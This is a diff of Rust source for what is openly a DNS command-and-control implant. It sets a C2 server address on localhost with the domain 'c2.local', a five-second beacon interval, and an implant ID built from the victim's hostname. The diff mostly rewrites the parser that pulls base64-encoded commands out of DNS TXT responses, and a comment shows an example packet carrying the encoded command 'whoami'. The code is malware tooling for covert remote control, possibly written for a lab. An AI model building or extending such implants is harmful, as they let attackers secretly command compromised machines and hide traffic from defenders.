@@ -3,7 +3,7 @@ use std::process::Command;
 use std::thread;
 use std::time::Duration;
 
-pub const C2_SERVER: &str = "127.0.0.1:5353";
+pub const C2_SERVER: &str = "127.0.0.1:55353";
 pub const DOMAIN: &str = "c2.local";
 pub const BEACON_INTERVAL: u64 = 5; // seconds
 
@@ -36,21 +36,20 @@ pub fn build_dns_query(domain: &str, qtype: u16) -> Vec<u8> {
     query
 }
 
-
 pub fn generate_implant_id() -> String {
     let hostname = hostname::get()
         .ok()
         .and_then(|h| h.into_string().ok())
         .unwrap_or_else(|| "unknown".to_string());
-    
+
     let random = std::time::SystemTime::now()
         .duration_since(std::time::UNIX_EPOCH)
         .unwrap()
-        .as_secs() % 10000;
-    
+        .as_secs()
+        % 10000;
+
     format!("{}_{}", hostname, random)
 }
-
 
 // Parse A record response
 pub fn parse_a_response(response: &[u8]) -> Option<[u8; 4]> {
@@ -84,27 +83,67 @@ pub fn parse_a_response(response: &[u8]) -> Option<[u8; 4]> {
 }
 
 // Parse TXT record response
+/* Example expected input:
+--header--
+13, 37, // header ID
+81, 80, // Flags 0x8180
+00, 01, // qd_count
+00, 01, // an_count
+00, 00, // ns_count
+00, 00, // ar_count
+--end header--
+--question section--
+03,                     // label length = 3
+63, 6d, 64,             // Controller request = "cmd"
+0d,                     // label length = 13
+41, 72, 78, 55, 6d, 62, 72, 61, 5f, 33, 38, 33, 34, // Implant ID ="ArxUmbra_3834"
+02,                     // label length = 2
+63, 32,                 // "c2"
+05,                     // label length = 5
+6c, 6f, 63, 61, 6c,     // "local"
+00,                     // end of domain name label
+00, 10,                 // QTYPE
+00, 01,                 // QCLASS
+--end question section--
+// Answer Section
+c0, 0c,                 // Pointer to domain name
+00, 10,                 // Type TXT
+00, 01,                 // Class IN
+00, 00, 00, 3c,         // TTL
+00, 09,                 // RDLENGTH
+08,                     // TXT string length
+64, 32, 68, 76, 59, 57, 31, 70 // Payload = "d2hvYW1p"
+
+* We just need to skip past all of this and grab the payload
+*/
 pub fn parse_txt_response(response: &[u8]) -> Option<String> {
+    // If the response is only the header - skip
     if response.len() < 12 {
         return None;
     }
 
-    let an_count = u16::from_be_bytes([response[6], response[7]]);
-    if an_count == 0 {
-        return None;
-    }
+    let mut next_read_length: usize; // byte count for each section
+    let mut current_position = 12; // skip header (12 bytes)
 
-    // Find TXT data (simplified parser - looks for length byte + data near end)
-    for i in 12..response.len() {
-        if i + 1 < response.len() {
-            let txt_len = response[i] as usize;
-            if i + 1 + txt_len <= response.len() {
-                let txt_data = &response[i + 1..i + 1 + txt_len];
-                if let Ok(s) = String::from_utf8(txt_data.to_vec()) {
-                    return Some(s);
-                }
-            }
-        }
+    // Skip over question section
+    for _ in 0..4 {
+        next_read_length = response[current_position] as usize;
+        current_position += next_read_length + 1; // Plus 1 skips the just read label length byte
+    }
+    assert!(
+        response[current_position] == 00,
+        "Error skipping and/or processing txt response. end of question section non 0!!! Got: {}",
+        response[current_position]
+    );
+
+    current_position += 17; // Skip QTYPE, QCLASS and answer section to TXT string length
+
+    let txt_string_len = response[current_position];
+
+    // Read the TXT data into a string to return
+    let txt_data = &response[current_position + 1..current_position + 1 + txt_string_len as usize]; // This increments the current pos past the len byte then fills with num bytes given by the len
+    if let Ok(txt_data) = String::from_utf8(txt_data.to_vec()) {
+        return Some(txt_data);
     }
 
     None
@@ -115,7 +154,6 @@ pub fn base64_decode(encoded: &str) -> Result<String, &'static str> {
     const CHARS: &str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
     let mut result = Vec::new();
     let cleaned: String = encoded.chars().filter(|c| *c != '=').collect();
-
     for chunk in cleaned.as_bytes().chunks(4) {
         let b1 = CHARS.find(chunk[0] as char).ok_or("Invalid base64")? as u32;
         let b2 = CHARS
